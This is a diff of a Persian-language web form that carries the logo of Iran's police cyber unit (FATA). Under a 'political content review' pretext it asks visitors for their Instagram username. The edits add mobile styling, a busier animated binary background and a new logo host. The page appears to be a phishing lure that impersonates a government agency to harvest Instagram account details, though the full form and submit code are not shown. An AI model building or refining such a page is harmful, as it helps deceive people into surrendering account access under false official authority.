@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title> درخواست برسی محتوای سیاسی</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap" rel="stylesheet">
@@ -12,28 +12,30 @@
             background: #ffffff;
             position: relative;
             overflow: hidden;
+            min-height: 100vh;
+            width: 100%;
         }
         
         .form-container {
-            background-color: rgba(255, 255, 255, 0.9);
+            background-color: rgba(255, 255, 255, 0.95);
             border: 1px solid #e5e7eb;
             z-index: 10;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
         }
         
         .binary-stream {
             position: absolute;
             color: #10b981;
             font-family: monospace;
-            font-size: 14px;
             white-space: nowrap;
             user-select: none;
-            opacity: 0.3;
             z-index: 1;
         }
         
         .image-placeholder {
-            width: 100px;
-            height: 100px;
+            width: 80px;
+            height: 80px;
             border: 2px dashed #ccc;
             border-radius: 50%;
             display: flex;
@@ -46,27 +48,50 @@
         .submit-button {
             background: linear-gradient(90deg, #10b981, #059669);
         }
+        
+        /* Mobile optimizations */
+        @media (max-width: 640px) {
+            .form-container {
+                width: 90%;
+                max-width: 100%;
+                padding: 1.25rem;
+                margin: 0 auto;
+            }
+            
+            .image-placeholder {
+                width: 70px;
+                height: 70px;
+            }
+            
+            input, button {
+                font-size: 16px; /* Prevent zoom on focus in iOS */
+            }
+            
+            .submit-button {
+                padding: 0.75rem 1rem;
+            }
+        }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
-    <!-- Binary streams -->
+<body class="flex items-center justify-center p-4">
+    <!-- Binary streams container -->
     <div id="binary-container"></div>
     
-    <div class="form-container w-full max-w-md p-8 rounded-2xl shadow-xl">
-        <div class="text-center mb-8">
+    <div class="form-container w-full max-w-md p-6 sm:p-8 rounded-2xl shadow-xl">
+        <div class="text-center mb-6">
             <!-- Image placeholder - replace with your own image -->
             <div id="image-placeholder" class="image-placeholder">
                 <span class="text-gray-400"></span>
-                <img src="https://uploadkon.ir/uploads/038621_25IRI-NAJA-FATA-New-.svg" alt="">
+                <img src="https://i.postimg.cc/MHPCF68N/IRI-NAJA-FATA-New.png" alt="">
             </div>
-            <h1 class="text-2xl font-bold text-gray-800">برای درخواست برسی لطفا اطلاعات خود را درست وارد نمایید.</h1>
+            <h1 class="text-xl sm:text-2xl font-bold text-gray-800">برای درخواست برسی لطفا اطلاعات خود را درست وارد نمایید.</h1>
         </div>
         
-        <div class="bg-green-100 p-4 rounded-lg mb-6 text-center">
-            <p class="text-green-800 font-bold text-lg">از ارسال کردن درخواست مکرر جدا خودداری کنید.</p>
+        <div class="bg-green-100 p-3 sm:p-4 rounded-lg mb-5 text-center">
+            <p class="text-green-800 font-bold text-base sm:text-lg">از ارسال کردن درخواست مکرر جدا خودداری کنید.</p>
         </div>
         
-        <form id="registrationForm" class="space-y-6">
+        <form id="registrationForm" class="space-y-5">
             <div>
                 <label for="username" class="block text-sm font-medium text-gray-700 mb-1">نام کاربری اینستاگرام</label>
                 <div class="relative">
@@ -92,15 +117,13 @@
             </div>
             
             <div class="pt-2">
-                <button type="submit" class="w-full submit-button text-white py-3 px-4 rounded-lg font-medium hover:opacity-90 transition-opacity focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500">
-                    ثبت درخواست برسی
+                <button type="submit" class="w-full submit-button text-white py-3 px-4 rounded-lg font-medium hover:opacity-90 transition-opacity focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 text-base">
+                    ثبت سفارش
                 </button>
             </div>
         </form>
         
-        <div class="mt-6 text-center text-sm text-gray-600">
-            <p>با ثبت نام، شما <a href="#" class="text-green-600 hover:underline">قوانین و مقررات</a> ما را می‌پذیرید.</p>
-        </div>
+      
         
         <div id="successMessage" class="hidden mt-4 bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded relative" role="alert">
             <strong class="font-bold">موفقیت!</strong>
@@ -127,62 +150,325 @@
             }
         });
         
+        // Generate binary string
+        function generateBinaryString(length) {
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += Math.random() > 0.5 ? '1' : '0';
+                // Sometimes add space, sometimes don't for more chaotic look
+                if (Math.random() > 0.7) {
+                    result += ' ';
+                }
+            }
+            return result;
+        }
+        
         // Create binary streams
         function createBinaryStreams() {
             const container = document.getElementById('binary-container');
+            container.innerHTML = ''; // Clear existing streams
+            
             const windowWidth = window.innerWidth;
             const windowHeight = window.innerHeight;
+            const isMobile = window.innerWidth < 768;
             
-            // Create 10 binary streams
-            for (let i = 0; i < 10; i++) {
-                const stream = document.createElement('div');
-                stream.className = 'binary-stream';
+            // Adjust number of streams based on device
+            const horizontalStreams = isMobile ? 20 : 50;
+            const verticalStreams = isMobile ? 10 : 30;
+            const diagonalStreams = isMobile ? 8 : 20;
+            const staticStreams = isMobile ? 5 : 10;
+            
+            // Create horizontal streams
+            for (let i = 0; i < horizontalStreams; i++) {
+                createHorizontalStream(container, windowWidth, windowHeight);
+            }
+            
+            // Create vertical streams
+            for (let i = 0; i < verticalStreams; i++) {
+                createVerticalStream(container, windowWidth, windowHeight);
+            }
+            
+            // Create diagonal streams
+            for (let i = 0; i < diagonalStreams; i++) {
+                createDiagonalStream(container, windowWidth, windowHeight);
+            }
+            
+            // Create static background streams
+            for (let i = 0; i < staticStreams; i++) {
+                createStaticStream(container, windowWidth, windowHeight);
+            }
+        }
+        
+        function createHorizontalStream(container, windowWidth, windowHeight) {
+            const stream = document.createElement('div');
+            stream.className = 'binary-stream';
+            
+            // Random position
+            const top = Math.random() * windowHeight;
+            const left = Math.random() * windowWidth;
+            
+            // Random speed
+            const speed = 1 + Math.random() * 5;
+            
+            // Random size and opacity
+            const fontSize = 6 + Math.floor(Math.random() * 8);
+            const opacity = 0.1 + Math.random() * 0.3;
+            
+            // Generate dense binary string
+            const binaryLength = 50 + Math.floor(Math.random() * 100);
+            const binaryString = generateBinaryString(binaryLength);
+            
+            stream.textContent = binaryString;
+            stream.style.top = `${top}px`;
+            stream.style.left = `${left}px`;
+            stream.style.fontSize = `${fontSize}px`;
+            stream.style.opacity = opacity;
+            
+            container.appendChild(stream);
+            
+            // Animate the stream
+            let position = left;
+            function animate() {
+                position -= speed;
                 
-                // Random position
-                const top = Math.random() * windowHeight;
-                const left = Math.random() * windowWidth;
+                // Reset position when off screen
+                if (position < -2000) {
+                    position = windowWidth;
+                    stream.style.top = `${Math.random() * windowHeight}px`;
+                    stream.textContent = generateBinaryString(binaryLength);
+                }
                 
-                // Random speed
-                const speed = 5 + Math.random() * 15;
+                stream.style.left = `${position}px`;
+                requestAnimationFrame(animate);
+            }
+            
+            animate();
+        }
+        
+        function createVerticalStream(container, windowWidth, windowHeight) {
+            const stream = document.createElement('div');
+            stream.className = 'binary-stream';
+            
+            // Random position
+            const top = -300 - Math.random() * 200;
+            const left = Math.random() * windowWidth;
+            
+            // Random speed
+            const speed = 1 + Math.random() * 4;
+            
+            // Random size and opacity
+            const fontSize = 6 + Math.floor(Math.random() * 8);
+            const opacity = 0.1 + Math.random() * 0.3;
+            
+            // Generate binary string (vertical)
+            let binaryString = '';
+            for (let j = 0; j < 40; j++) {
+                binaryString += Math.random() > 0.5 ? '1' : '0';
+                // Sometimes add line break, sometimes don't for more chaotic look
+                if (Math.random() > 0.3) {
+                    binaryString += '<br>';
+                }
+            }
+            
+            stream.innerHTML = binaryString;
+            stream.style.top = `${top}px`;
+            stream.style.left = `${left}px`;
+            stream.style.fontSize = `${fontSize}px`;
+            stream.style.opacity = opacity;
+            stream.style.whiteSpace = 'normal';
+            stream.style.textAlign = 'center';
+            stream.style.width = 'auto';
+            
+            container.appendChild(stream);
+            
+            // Animate the stream
+            let position = top;
+            function animate() {
+                position += speed;
                 
-                // Generate binary string
-                let binaryString = '';
-                for (let j = 0; j < 100; j++) {
+                // Reset position when off screen
+                if (position > windowHeight) {
+                    position = -300 - Math.random() * 200;
+                    stream.style.left = `${Math.random() * windowWidth}px`;
+                    
+                    let newBinaryString = '';
+                    for (let j = 0; j < 40; j++) {
+                        newBinaryString += Math.random() > 0.5 ? '1' : '0';
+                        if (Math.random() > 0.3) {
+                            newBinaryString += '<br>';
+                        }
+                    }
+                    stream.innerHTML = newBinaryString;
+                }
+                
+                stream.style.top = `${position}px`;
+                requestAnimationFrame(animate);
+            }
+            
+            animate();
+        }
+        
+        function createDiagonalStream(container, windowWidth, windowHeight) {
+            const stream = document.createElement('div');
+            stream.className = 'binary-stream';
+            
+            // Random position
+            const top = Math.random() * windowHeight;
+            const left = Math.random() * windowWidth;
+            
+            // Random speeds
+            const speedX = 1 + Math.random() * 3;
+            const speedY = 1 + Math.random() * 3;
+            
+            // Direction (1 = down-right, -1 = down-left)
+            const directionX = Math.random() > 0.5 ? 1 : -1;
+            
+            // Random size and opacity
+            const fontSize = 6 + Math.floor(Math.random() * 8);
+            const opacity = 0.1 + Math.random() * 0.3;
+            
+            // Generate binary string
+            const binaryLength = 20 + Math.floor(Math.random() * 30);
+            const binaryString = generateBinaryString(binaryLength);
+            
+            stream.textContent = binaryString;
+            stream.style.top = `${top}px`;
+            stream.style.left = `${left}px`;
+            stream.style.fontSize = `${fontSize}px`;
+            stream.style.opacity = opacity;
+            stream.style.transform = `rotate(${directionX > 0 ? 45 : -45}deg)`;
+            
+            container.appendChild(stream);
+            
+            // Animate the stream
+            let positionX = left;
+            let positionY = top;
+            
+            function animate() {
+                positionX += speedX * directionX;
+                positionY += speedY;
+                
+                // Reset position when off screen
+                if (positionY > windowHeight || positionX < -500 || positionX > windowWidth + 500) {
+                    positionX = Math.random() * windowWidth;
+                    positionY = -100;
+                    stream.textContent = generateBinaryString(binaryLength);
+                }
+                
+                stream.style.left = `${positionX}px`;
+                stream.style.top = `${positionY}px`;
+                requestAnimationFrame(animate);
+            }
+            
+            animate();
+        }
+        
+        function createStaticStream(container, windowWidth, windowHeight) {
+            const stream = document.createElement('div');
+            stream.className = 'binary-stream';
+            
+            // Random position
+            const top = Math.random() * windowHeight;
+            const left = Math.random() * windowWidth;
+            
+            // Random size and opacity
+            const fontSize = 6 + Math.floor(Math.random() * 8);
+            const opacity = 0.1 + Math.random() * 0.2;
+            
+            // Generate binary cluster
+            let binaryString = '';
+            const rows = 5 + Math.floor(Math.random() * 10);
+            const cols = 5 + Math.floor(Math.random() * 10);
+            
+            for (let i = 0; i < rows; i++) {
+                for (let j = 0; j < cols; j++) {
                     binaryString += Math.random() > 0.5 ? '1' : '0';
                     binaryString += ' ';
                 }
-                
-                stream.textContent = binaryString;
-                stream.style.top = `${top}px`;
-                stream.style.left = `${left}px`;
-                
-                container.appendChild(stream);
-                
-                // Animate the stream
-                let position = left;
-                function animate() {
-                    position -= speed;
-                    
-                    // Reset position when off screen
-                    if (position < -2000) {
-                        position = windowWidth;
-                        stream.style.top = `${Math.random() * windowHeight}px`;
-                    }
-                    
-                    stream.style.left = `${position}px`;
-                    requestAnimationFrame(animate);
-                }
-                
-                animate();
+                binaryString += '<br>';
             }
+            
+            stream.innerHTML = binaryString;
+            stream.style.top = `${top}px`;
+            stream.style.left = `${left}px`;
+            stream.style.fontSize = `${fontSize}px`;
+            stream.style.opacity = opacity;
+            stream.style.whiteSpace = 'normal';
+            
+            container.appendChild(stream);
+            
+            // Flicker effect
+            setInterval(() => {
+                if (Math.random() > 0.7) {
+                    let newBinaryString = '';
+                    for (let i = 0; i < rows; i++) {
+                        for (let j = 0; j < cols; j++) {
+                            newBinaryString += Math.random() > 0.5 ? '1' : '0';
+                            newBinaryString += ' ';
+                        }
+                        newBinaryString += '<br>';
+                    }
+                    stream.innerHTML = newBinaryString;
+                }
+            }, 1000 + Math.random() * 2000);
         }
         
         // Initialize binary streams
         window.addEventListener('load', createBinaryStreams);
-        window.addEventListener('resize', function() {
-            document.getElementById('binary-container').innerHTML = '';
-            createBinaryStreams();
+        window.addEventListener('resize', createBinaryStreams);
+        
+        // Add more streams periodically for extra chaos
+        let streamInterval;
+        
+        function startStreamInterval() {
+            // Clear any existing interval
+            if (streamInterval) clearInterval(streamInterval);
+            
+            // Adjust interval based on device
+            const isMobile = window.innerWidth < 768;
+            const interval = isMobile ? 1000 : 500;
+            const maxStreams = isMobile ? 100 : 200;
+            
+            streamInterval = setInterval(() => {
+                const container = document.getElementById('binary-container');
+                const windowWidth = window.innerWidth;
+                const windowHeight = window.innerHeight;
+                
+                // Add a random stream type
+                const streamType = Math.floor(Math.random() * 4);
+                switch(streamType) {
+                    case 0:
+                        createHorizontalStream(container, windowWidth, windowHeight);
+                        break;
+                    case 1:
+                        createVerticalStream(container, windowWidth, windowHeight);
+                        break;
+                    case 2:
+                        createDiagonalStream(container, windowWidth, windowHeight);
+                        break;
+                    case 3:
+                        createStaticStream(container, windowWidth, windowHeight);
+                        break;
+                }
+                
+                // Limit total number of streams to prevent performance issues
+                if (container.children.length > maxStreams) {
+                    container.removeChild(container.firstChild);
+                }
+            }, interval);
+        }
+        
+        window.addEventListener('load', startStreamInterval);
+        window.addEventListener('resize', startStreamInterval);
+        
+        // Optimize for mobile - reduce animations when page is not visible
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                if (streamInterval) clearInterval(streamInterval);
+            } else {
+                startStreamInterval();
+            }
         });
     </script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'962bd038e3b9ccf7',t:'MTc1MzExMjYwMC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'962c1960f0a74d82',t:'MTc1MzExNTU5Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
